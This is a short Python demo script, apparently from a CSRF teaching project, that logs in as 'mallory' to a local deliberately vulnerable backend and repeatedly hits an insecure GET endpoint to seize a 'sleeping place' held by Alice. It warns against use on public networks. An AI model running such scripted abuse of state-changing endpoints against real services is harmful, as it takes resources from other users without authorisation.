#!/usr/bin/env python

"""
Tries to claim the best sleeping place, by requesting it over and over again until it worked.
As soon as Alice opens the ad page and the best sleeping place is free, this script tries to claim it.

Before running this script, make sure that the vulnerable CSRF demo backend (./vulnerable-backend/) is running.

WARNING: Do not run this on a public network. This is just intended for demonstration purposes on your local machine.
Always ask for permission before running scripts like this.
"""
import asyncio

import httpx

BASE_URL = "http://localhost:8000"


def claim_best_sleeping_place(client):
    """Tries to claim the best sleeping place (1) that is currently claimed by Alice."""
    return client.get(f"{BASE_URL}/insecure-claim-sleeping-place/1/")


def create_client_with_session():
    """Logs mallory in so that she can try to claim the best sleeping place."""
    client = httpx.Client(follow_redirects=True)

    client.get(f"{BASE_URL}/accounts/login/")
    csrf_token = client.cookies["csrftoken"]

    client.post(
        f"{BASE_URL}/accounts/login/",
        data={"csrfmiddlewaretoken": csrf_token, "username": "mallory", "password": "csrf1234"},
    )
    return client


async def run():
    client = create_client_with_session()

    success = False
    attempts = 0
    while success is False:
        attempts += 1
        print(f"Attempt {attempts}: Trying to claim the best sleeping placeâ€¦")

        response = claim_best_sleeping_place(client)
        success = "In front of the fireplace claimed by mallory" in response.content.decode()
        if success:
            break

        # Try to limit spamming the server
        await asyncio.sleep(3)

    print("The best sleeping place is mine. Muhahaha!")


if __name__ == "__main__":
    asyncio.run(run())
